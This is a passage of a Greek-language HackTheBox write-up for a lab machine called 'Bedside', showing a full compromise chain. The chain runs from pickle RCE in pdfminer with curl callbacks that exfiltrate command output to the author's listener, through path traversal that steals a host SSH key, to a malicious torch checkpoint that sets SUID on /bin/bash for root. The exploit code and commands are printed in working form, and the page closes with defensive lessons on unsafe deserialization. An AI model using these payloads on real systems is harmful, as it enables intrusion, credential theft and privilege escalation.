+  <h2>Foothold — ο watcher παίρνει το δόλωμα</h2>
+
+  <p>Ένα ζωντανό reverse shell που προσγειώνεται στο terminal μου είναι το πιο θορυβώδες πράγμα που μπορείς να κάνεις, οπότε δεν χρησιμοποίησα ποτέ ένα. Αντ' αυτού απέδειξα εκτέλεση out-of-band: κάνε το payload να κάνει <code>curl</code> ένα marker πίσω σε έναν listener που ελέγχω. Ο στόχος τραβάει — request/response, τίποτα inbound.</p>
+
+  <div class="terminal">
+    <div class="term-bar">
+      <span class="dot dr"></span><span class="dot dy"></span><span class="dot dg"></span>
+      <span class="term-label">prove RCE with a callback</span>
+    </div>
+    <div class="term-body"><span class="pd">$ </span><span class="pc">python3 -m http.server 8000 &amp;                 </span><span class="pco"># listener on my VPN ip</span>
+<span class="pd">$ </span><span class="pc">python3 build_and_send.py 'curl -s http://&lt;VPN&gt;:8000/HIT-$(hostname)-$(id -un)'</span>
+<span class="pco"># ~30s later, in the http.server log:</span>
+<span class="pg">&lt;IP&gt; - - "GET /HIT-data-wrangler-datawrangler HTTP/1.1"</span></div>
+  </div>
+
+  <p>Εκτέλεση κώδικα σαν <code>datawrangler</code> σε έναν host που αυτοαποκαλείται <code>data-wrangler</code>. Η καθυστέρηση ~30 δευτερολέπτων είναι η ομολογία: το upload μου δεν πυροδότησε τίποτα — ένα <strong>προγραμματισμένο job</strong> ξύπνησε, βρήκε ένα νέο PDF, και το επεξεργάστηκε. (Ένας πρώιμος marker γραμμένος κατευθείαν στο web root είχε αποτύχει σιωπηλά: ο watcher τρέχει σαν <code>datawrangler</code> και δεν μπορεί να γράψει τον φάκελο <code>uploads/</code> που ανήκει στον <code>www-data</code>. Το callback παρακάμπτει εντελώς τα δικαιώματα αρχείων.)</p>
+
+  <p>Container recon, exfiltrated με τον ίδιο τρόπο — κάνε pipe το output εντολής σε ένα <code>POST</code> που ο listener μου αποθηκεύει στον δίσκο:</p>
+
+  <div class="terminal">
+    <div class="term-bar">
+      <span class="dot dr"></span><span class="dot dy"></span><span class="dot dg"></span>
+      <span class="term-label">who am I, and what's shared</span>
+    </div>
+    <div class="term-body"><span class="po">uid=988(datawrangler) gid=1001(dataops) groups=1001(dataops)
+
+</span><span class="pd">$ </span><span class="pc">cat /app/pdf_watcher.py</span><span class="pco">   # the job that ran my payload</span>
+<span class="po">UPLOAD_DIR = "/var/www/research.bedside.htb/uploads"
+OUTPUT_DIR = "/datastore/staging"
+while True:
+    for pdf in glob.glob(UPLOAD_DIR + "/</span><span class="py">*.pdf</span><span class="po">"):        </span><span class="pco"># only real PDFs, ever</span><span class="po">
+        subprocess.run(["pdf2txt.py", pdf, "-o", out]) </span><span class="pco"># pdf2txt.py == pdfminer</span><span class="po">
+    time.sleep(30)</span></div>
+  </div>
+
+  <p>Αυτό επιβεβαιώνει όλη τη θεωρία: ο βρόχος κάνει glob <code>*.pdf</code> κάθε 30&nbsp;δευτερόλεπτα και τροφοδοτεί το καθένα στο <code>pdf2txt.py</code> — pdfminer κατευθείαν μέσα στο CVE. Εξηγεί επίσης έναν τοίχο από πριν: το <code>process_pdf()</code> απορρίπτει ρητά symlinks και μη-κανονικά αρχεία, οπότε η ιδέα archive-symlink δεν επρόκειτο ποτέ να δουλέψει. Ο developer σκέφτηκε εκείνη τη συγκεκριμένη επίθεση. Δεν σκέφτηκε ένα PDF που δείχνει σε ένα pickle. Το output προσγειώνεται στο <code>/datastore/staging</code> — έναν φάκελο έξω από το <code>/app</code>, και ο <code>datawrangler</code> είναι στην ομάδα <code>dataops</code> που τον κατέχει. Το κοινόχρηστο storage ανάμεσα σε containers είναι ακριβώς το είδος της ραφής που αξίζει να ανοίξεις.</p>
+
+  <!-- ══ LATERAL ══ -->
+  <h2>Πλάγια κίνηση — το λάθος chart</h2>
+
+  <p>Το container είναι γυμνό αλλά έχει <code>curl</code> και <code>python3</code>. Το να διαβάσεις το <code>/proc/net/route</code> δίνει το gateway Docker (<code>172.17.0.1</code>)· μια μικροσκοπική σάρωση socket από μέσα βρίσκει μια θύρα που το εξωτερικό nmap δεν είδε ποτέ γιατί ακούει μόνο στο bridge: <strong>3000</strong>. Σερβίρει "Bedside Clinic - Image Viewer," μια εφαρμογή React για slices MRI — το είδος πράγματος που κρύβει ένα path traversal στο API του για ανάκτηση slice.</p>
+
+  <p>Μόνο που το API είναι ψεύτικο. Το ίδιο του το JavaScript δημιουργεί slices με <code>Math.random()</code> — <code>"// For demo"</code>. Δεν υπάρχει <code>/api/slice</code>, καμία παράμετρος αρχείου, τίποτα server-side να επιτεθείς <em>μέσα από την εφαρμογή</em>. Παραλίγο να βυθίσω μια ώρα σε ένα endpoint που δεν υπήρξε ποτέ. Το πραγματικό ελάττωμα είναι ένα layer παρακάτω: η εφαρμογή είναι διακόσμηση, αλλά αυτό που τη σερβίρει είναι ακόμα ένας πραγματικός static file server, και οι static servers έχουν το δικό τους κλασικό bug. Στόχευσε το traversal στο root του server αντί να μαντεύεις routes εφαρμογής — με <code>--path-as-is</code> ώστε το curl να μην συμπτύσσει βοηθητικά τα <code>../</code> πριν στείλει:</p>
+
+  <div class="terminal">
+    <div class="term-bar">
+      <span class="dot dr"></span><span class="dot dy"></span><span class="dot dg"></span>
+      <span class="term-label">path traversal off the static server (run in-container)</span>
+    </div>
+    <div class="term-body"><span class="pd">$ </span><span class="pc">curl -s --path-as-is 'http://172.17.0.1:3000/../../../../etc/passwd' | tail -4</span>
+<span class="po">developer:x:1000:1000:developer,,,:/home/developer:/bin/bash
+datawrangler:x:988:1001::/home/datawrangler:/bin/sh
+_laurel:x:987:987::/var/log/laurel:/bin/false
+polkitd:x:986:986:User for polkitd:/:/usr/sbin/nologin</span></div>
+  </div>
+
+  <p>Αυτό δεν είναι το <code>/etc/passwd</code> του container — έχει <code>developer</code>, <code>_laurel</code>, <code>polkitd</code>, χρήστες που το minimal container δεν έχει. Η υπηρεσία στη θύρα 3000 διαβάζει αρχεία από το filesystem του <strong>host</strong>, και το traversal διαβάζει οποιοδήποτε από αυτά. Μια καταχώρηση <code>/etc/passwd</code> είναι μια συστατική, όχι τρόπος εισόδου — αλλά αυθαίρετη ανάγνωση αρχείου host σημαίνει ότι μπορώ απλά να ζητήσω το κλειδί SSH του <code>developer</code> και το flag χρήστη. Το κλειδί δεν είναι στο <code>id_ed25519</code>· μια γρήγορη σάρωση υποψήφιων ονομάτων το βρίσκει στο <code>id_rsa</code>:</p>
+
+  <div class="terminal">
+    <div class="term-bar">
+      <span class="dot dr"></span><span class="dot dy"></span><span class="dot dg"></span>
+      <span class="term-label">steal the host SSH key + user.txt</span>
+    </div>
+    <div class="term-body"><span class="pd">$ </span><span class="pc">B=../../../../home/developer; T=http://172.17.0.1:3000
+for f in .ssh/id_ed25519 .ssh/id_rsa .ssh/id_ecdsa; do
+  echo "== $f =="; curl -s --path-as-is "$T/$B/$f" | head -1
+done</span>
+<span class="po">== .ssh/id_ed25519 ==
+</span><span class="pr">Not Found</span><span class="po">
+== .ssh/id_rsa ==
+</span><span class="pg">-----BEGIN OPENSSH PRIVATE KEY-----</span><span class="po">
+== .ssh/id_ecdsa ==
+</span><span class="pr">Not Found</span><span class="po">
+
+</span><span class="pd">$ </span><span class="pc">curl -s --path-as-is "$T/$B/user.txt"</span>
+<span class="pg">4d6ea9a8…  </span><span class="pco"># user.txt</span></div>
+  </div>
+
+  <p>Ένα unencrypted κλειδί ed25519 (αποθηκευμένο ως <code>id_rsa</code>), comment <code>developer@bedside</code>. Διόρθωσε τα perms του και περπάτησε κατευθείαν στον host, έξω από το container για πάντα:</p>
+
+  <div class="terminal">
+    <div class="term-bar">
+      <span class="dot dr"></span><span class="dot dy"></span><span class="dot dg"></span>
+      <span class="term-label">onto the host as developer</span>
+    </div>
+    <div class="term-body"><span class="pd">$ </span><span class="pc">chmod 600 dev_key; ssh -i dev_key developer@&lt;IP&gt; 'id; sudo -n -l'</span>
+<span class="po">uid=1000(developer) gid=1000(developer) groups=1000(developer),100(users)
+User developer may run the following commands on bedside:
+    (ALL) NOPASSWD: </span><span class="py">/usr/bin/python3 /opt/trainer/bedside_trainer.py</span></div>
+  </div>
+
+  <!-- ══ ROOT ══ -->
+  <h2>Privilege escalation — η δεύτερη δόση</h2>
+
+  <p>Μία εντολή, χωρίς password: ένα script training MONAI που τρέχει σαν root. Διαβάζοντάς το, η ευάλωτη γραμμή ξεχωρίζει αμέσως — συνεχίζει από το νεότερο checkpoint χρησιμοποιώντας το <code>CheckpointLoader</code> του MONAI, που καλεί <code>torch.load(…, weights_only=False)</code> από κάτω, και το <code>torch.load</code> κάνει deserialize με <code>pickle</code>. Η ίδια πληγή με το foothold, φορώντας διαφορετικό παλτό: τάισέ το με ένα κακόβουλο <code>.pt</code> και το <code>__reduce__</code> του τρέχει σαν root.</p>
+
+  <div class="terminal">
+    <div class="term-bar">
+      <span class="dot dr"></span><span class="dot dy"></span><span class="dot dg"></span>
+      <span class="term-label">/opt/trainer/bedside_trainer.py (excerpt)</span>
+    </div>
+    <div class="term-body"><span class="po">latest_ckpt = find_latest_checkpoint(CHECKPOINT_DIR)   </span><span class="pco"># newest *.pt in /datastore/checkpoints</span><span class="po">
+if latest_ckpt:
+    loader = CheckpointLoader(load_path=str(latest_ckpt),
+                              load_dict={"model": model, "optimizer": optimizer})
+    loader(engine)   </span><span class="pco"># -&gt; torch.load(weights_only=False) -&gt; pickle.load -&gt; RCE</span></div>
+  </div>
+
+  <p>Το σχέδιο γράφεται μόνο του — φύτεψε ένα κακόβουλο checkpoint στο <code>/datastore/checkpoints/</code>, τρέξε τον trainer, πάρε root — αλλά το script έχει guards που μετατρέπουν ένα one-liner σε καβγά.</p>
+
+  <h3>Guard 1 — η πύλη δεδομένων</h3>
+
+  <p>Ο trainer δεν φτάνει ποτέ στον checkpoint loader εκτός αν έχει δεδομένα για να κάνει train. Σαρώνει το <code>/datastore/processed/</code> για έγκυρες εικόνες και βγαίνει νωρίς αν είναι άδειο. Και ο <code>developer</code> δεν μπορεί να γράψει καθόλου το <code>/datastore</code> — είναι <code>datawrangler:dataops</code>, και ο <code>developer</code> δεν είναι στο <code>dataops</code>. Αλλά το shell του container μου <em>είναι</em>. Το κοινόχρηστο volume <code>/datastore</code> είναι η ραφή: <strong>ο datawrangler γράφει τα αρχεία, ο developer τραβάει τη σκανδάλη.</strong> Δύο shells, ένα exploit. Οπότε φυτεύω ένα έγκυρο PNG στο <code>processed/</code> — με δεδομένα παρόντα, ο trainer παραλείπει εντελώς το promotion-from-staging και βαδίζει στον loader.</p>
+
+  <h3>Guard 2 — ο έλεγχος format</h3>
+
+  <p>Ένα ωμό pickle δεν κάνει τη δουλειά. Το <code>torch.load</code> περιμένει ένα πραγματικό torch archive: ένα ZIP που περιέχει <code>archive/data.pkl</code> (το pickled object graph) συν <code>archive/version</code>. Οπότε χτίζω ένα σωστά — ένα ZIP του οποίου το <code>data.pkl</code> είναι ένα payload σε σχήμα dict του οποίου το <code>__reduce__</code> τρέχει <code>chmod u+s /bin/bash</code>. Δεν χρειάζεται torch σε καμία πλευρά· καθαρό <code>zipfile</code> + <code>pickle</code> σε macOS:</p>
+
+  <div class="terminal">
+    <div class="term-bar">
+      <span class="dot dr"></span><span class="dot dy"></span><span class="dot dg"></span>
+      <span class="term-label">build_evil_pt.py — a valid torch checkpoint carrying pickle RCE</span>
+    </div>
+    <div class="term-body"><span class="pb">import</span><span class="po"> pickle, os, zipfile</span>
+<span class="pb">class</span><span class="pc"> RCE</span><span class="po">:
+    </span><span class="pb">def</span><span class="pc"> __reduce__</span><span class="po">(self):
+        </span><span class="pb">return</span><span class="po"> (os.system, ("chmod u+s /bin/bash",))
+payload = pickle.dumps({"model": RCE()}, protocol=2)
+with zipfile.ZipFile("evil.pt","w",zipfile.ZIP_STORED) as z:
+    z.writestr("archive/data.pkl", payload)
+    z.writestr("archive/version", "3\n")</span>
+<span class="pco"># magic bytes 50 4b 03 04 == PK == valid ZIP == valid torch archive</span></div>
+  </div>
+
+  <p>Και τα δύο αρχεία φτάνουν στο box <em>μέσω της πύλης</em> — δεν χρειάζεται να φιλοξενήσω τίποτα. Το <code>scan.png</code> είναι ήδη επιτρεπτό· το <code>evil.pt</code> είναι ένα έγκυρο ZIP, οπότε το ανεβάζω μετονομασμένο σε <code>evil.zip</code> και περνά τον έλεγχο MIME. Μετά ένα μόνο payload pickle-RCE (πυροδοτημένο με τον ίδιο τρόπο δύο-αρχείων) τα αντιγράφει από το <code>uploads/</code> στο <code>/datastore</code> σαν <code>datawrangler</code>, και ρίχνει έναν βρόχο cleanup ώστε το αδέσποτο output <code>.txt</code> του watcher να μην μπορεί ποτέ να σπάσει το pipeline:</p>
+
+  <div class="terminal">
+    <div class="term-bar">
+      <span class="dot dr"></span><span class="dot dy"></span><span class="dot dg"></span>
+      <span class="term-label">stage payloads via the portal, plant from the container</span>
+    </div>
+    <div class="term-body"><span class="pd">$ </span><span class="pc">cp evil.pt evil.zip</span>
+<span class="pd">$ </span><span class="pc">curl -s -H "Host: research.bedside.htb" -F "uploadFile=@evil.zip;type=application/zip" http://&lt;IP&gt;/</span>
+<span class="pd">$ </span><span class="pc">curl -s -H "Host: research.bedside.htb" -F "uploadFile=@scan.png;type=image/png"     http://&lt;IP&gt;/</span>
+
+<span class="pco"># then, delivered as the pickle __reduce__ command (runs as datawrangler in the container):</span>
+<span class="pc">U=/var/www/research.bedside.htb/uploads
+cp $U/evil.zip  /datastore/checkpoints/checkpoint_epoch_99.pt
+cp $U/scan.png  /datastore/processed/scan.png
+setsid sh -c 'while true; do rm -f /datastore/staging/*.txt /datastore/processed/*.txt 2&gt;/dev/null; \
+              cp $U/scan.png /datastore/processed/scan.png 2&gt;/dev/null; sleep 0.3; done' &amp;</span></div>
+  </div>
+
+  <h3>Πυροδοτώντας το</h3>
+
+  <p>Με ένα έγκυρο checkpoint στη θέση του και το pipeline κρατημένο καθαρό, τρέξε τον sudo trainer από το shell του <code>developer</code>. Το <code>torch.load</code> κάνει unpickle το checkpoint μου σαν root και το <code>__reduce__</code> πυροδοτείται:</p>
+
+  <div class="terminal">
+    <div class="term-bar">
+      <span class="dot dr"></span><span class="dot dy"></span><span class="dot dg"></span>
+      <span class="term-label">root</span>
+    </div>
+    <div class="term-body"><span class="pd">$ </span><span class="pc">sudo -n /usr/bin/python3 /opt/trainer/bedside_trainer.py 2&gt;&amp;1 | tail -2</span>
+<span class="pr">TypeError: Expected state_dict to be dict-like, got &lt;class 'int'&gt;.</span>
+<span class="pd">$ </span><span class="pc">ls -la /bin/bash</span>
+<span class="pg">-rwsr-xr-x 1 root root 1298416 /bin/bash</span>
+<span class="pd">$ </span><span class="pc">/bin/bash -p -c 'id; cat /root/root.txt'</span>
+<span class="po">uid=1000(developer) </span><span class="pg">euid=0(root)</span><span class="po"> groups=1000(developer),100(users)
+7e529abc…  </span><span class="pco"># root.txt</span></div>
+  </div>
+
+  <p>Εκείνο το <code>TypeError</code> μοιάζει με άλλη μία αποτυχία. Δεν είναι. Το <code>os.system</code> επιστρέφει έναν ακέραιο exit code, και ο loader του torch περίμενε ένα dict, οπότε πέταξε error στην τιμή επιστροφής — αλλά εκείνη η τιμή επιστροφής υπάρχει μόνο <em>επειδή η εντολή έτρεξε ήδη</em>. Η εξαίρεση πυροδοτείται μετά το payload, όχι αντί για αυτό. Μία γραμμή παρακάτω, τα bits <code>s</code> στο <code>/bin/bash</code> είναι ορισμένα, και το <code>/bin/bash -p</code> κρατά το <code>euid=0</code>. Root.</p>
+
+  <!-- ══ RECAP ══ -->
+  <h2>Όλη η αλυσίδα, μία οθόνη</h2>
+
+  <div class="terminal">
+    <div class="term-bar">
+      <span class="dot dr"></span><span class="dot dy"></span><span class="dot dg"></span>
+      <span class="term-label">recap</span>
+    </div>
+    <div class="term-body"><span class="pco"># 1. vhost → το research.bedside.htb τρέχει pdfminer.six (κεφαλίδα X-Powered-By)</span>
+<span class="pc">ffuf -u http://bedside.htb -H "Host: FUZZ.bedside.htb" -w subdomains.txt -fc 301</span>
+
+<span class="pco"># 2. CVE-2025-64512: δύο αρχεία — κακόβουλο pickle + trigger PDF που το ονομάζει</span>
+<span class="pc">python3 build_and_send.py 'curl -s http://&lt;VPN&gt;:8000/HIT-$(id -un)'   # RCE σαν datawrangler</span>
+
+<span class="pco"># 3. εσωτερικό :3000 static server path traversal → κλειδί SSH host + user.txt</span>
+<span class="pc">curl -s --path-as-is 'http://172.17.0.1:3000/../../../../home/developer/.ssh/id_rsa'</span>
+
+<span class="pco"># 4. SSH σαν developer· sudo τρέχει έναν trainer MONAI που κάνει torch.load() ένα checkpoint</span>
+<span class="pc">ssh -i dev_key developer@&lt;IP&gt;   # sudo -n -l → NOPASSWD bedside_trainer.py</span>
+
+<span class="pco"># 5. φύτεψε ένα κακόβουλο .pt (σαν datawrangler, μέσω κοινόχρηστου /datastore) → root</span>
+<span class="pc">python3 build_evil_pt.py   # zip: archive/data.pkl __reduce__ = chmod u+s /bin/bash</span>
+<span class="pc">sudo -n /usr/bin/python3 /opt/trainer/bedside_trainer.py; /bin/bash -p -c 'cat /root/root.txt'</span></div>
+  </div>
+
+  <!-- ══ LESSONS ══ -->
+  <h2>Μαθήματα</h2>
+
+  <p>Το Bedside τρέχει πάνω σε ένα μόνο anti-pattern επαναλαμβανόμενο: <strong>το να κάνεις deserialize δεδομένα που δεν ελέγχεις</strong>. Το pdfminer το έκανε με <code>pickle</code> για να φορτώσει έναν χάρτη γραμματοσειράς· ο trainer MONAI το ξανάκανε με <code>torch.load</code> για να επαναφέρει ένα checkpoint. Κανένα από τα δύο δεν είναι εξωτικό — και τα δύο είναι ο default, βολικός τρόπος να κάνεις μια κανονική δουλειά, και και τα δύο δίνουν εκτέλεση κώδικα τη στιγμή που το input γίνεται εχθρικό. Αν πάρεις ένα πράγμα από αυτό το box, ας είναι ότι το <code>pickle.loads</code>, το <code>torch.load(weights_only=False)</code> και το <code>yaml.load</code> <em>δεν είναι file readers</em>. Είναι code executors που τυχαίνει να δέχονται αρχεία. Όρισε <code>weights_only=True</code>, χρησιμοποίησε <code>safetensors</code>, και κάνε validate πριν κάνεις deserialize.</p>
+
+  <ul>
+    <li><strong>Διάβασε, μην μαντεύεις.</strong> Κάθε τοίχος σε αυτό το box είχε μια πινακίδα πάνω του — το κρυμμένο <code>gz/zip</code> του whitelist, το path αποθήκευσης σε ένα error MIME, το glob <code>*.pdf</code> στον watcher, το comment <code>"// For demo"</code> που εξέθεσε το API στη θύρα 3000 σαν ψεύτικο. Κάθε πινακίδα ήταν στην πηγή ή στο μήνυμα error, όχι στις υποθέσεις μου.</li>
+    <li><strong>Το να ανεβάζεις δεν είναι parsing.</strong> Το polyglot ενός-αρχείου ήταν σωστό και αδρανές γιατί τίποτα δεν το κατανάλωσε στο upload. Το να καταλάβεις <em>τι</em> επεξεργάζεται το input σου, και <em>πότε</em>, είχε περισσότερη σημασία από το ίδιο το payload.</li>
+    <li><strong>Τα κοινόχρηστα volumes είναι σύνορα εμπιστοσύνης.</strong> Ο <code>developer</code> δεν μπορούσε να γράψει το <code>/datastore</code>, αλλά μια δεύτερη ταυτότητα που μοιραζόταν το volume μπορούσε. Το privesc ήταν συντονισμός δύο-shells, όχι μία εντολή.</li>
+    <li><strong>Το request/response νικά τα reverse shells.</strong> Callbacks, ένας listener που συλλέγει POST, αναγνώσεις path-traversal, και ένα κλειδί SSH — κάθε βήμα ήταν pull-based. Κανένα inbound shell να προσέχεις, και ένα πιο ήσυχο αποτύπωμα.</li>
+  </ul>
+
+  <p>Δύο flags, μία κλινική που εμπιστεύτηκε τα μηχανήματά της ακριβώς δύο φορές παραπάνω.</p>
+
+</div>
+<div class="htb-cta">
+  <a href="https://app.hackthebox.com/users/332355" target="_blank" rel="noopener">
+    <svg viewBox="0 0 24 24"><polygon points="12 2 22 8.5 22 15.5 12 22 2 15.5 2 8.5"/><line x1="12" y1="22" x2="12" y2="15.5"/><polyline points="22 8.5 12 15.5 2 8.5"/></svg>
+    <span><span class="l-t">HackTheBox</span><span class="l-s">My HTB profile &amp; more boxes</span></span>
+    <span class="l-x">↗</span>
+  </a>
+  <a href="https://github.com/s-markakis" target="_blank" rel="noopener">
+    <svg viewBox="0 0 24 24"><path d="M9 19c-5 1.5-5-2.5-7-3m14 6v-3.87a3.37 3.37 0 0 0-.94-2.61c3.14-.35 6.44-1.54 6.44-7A5.44 5.44 0 0 0 20 4.77 5.07 5.07 0 0 0 19.91 1S18.73.65 16 2.48a13.38 13.38 0 0 0-7 0C6.27.65 5.09 1 5.09 1A5.07 5.07 0 0 0 5 4.77a5.44 5.44 0 0 0-1.5 3.78c0 5.42 3.3 6.61 6.44 7A3.37 3.37 0 0 0 9 18.13V22"/></svg>
+    <span><span class="l-t">GitHub</span><span class="l-s">Open-source security &amp; automation tools</span></span>
+    <span class="l-x">↗</span>
+  </a>
+</div>
+<footer>
+  <span>© 2026 <a href="https://s-markakis.github.io/index.html">S. Markakis</a></span>
+  <span><a href="https://s-markakis.github.io/blog.html">← Ολα τα posts</a></span>
+</footer>
+
+<script src="../js/i18n.js" defer></script>
+<script src="../js/nav.js" defer></script>
+<script src="../js/writeup-sidebar.js" defer></script>
+<script src="../js/writeup-enhance.js" defer></script>
+</body>
+</html>
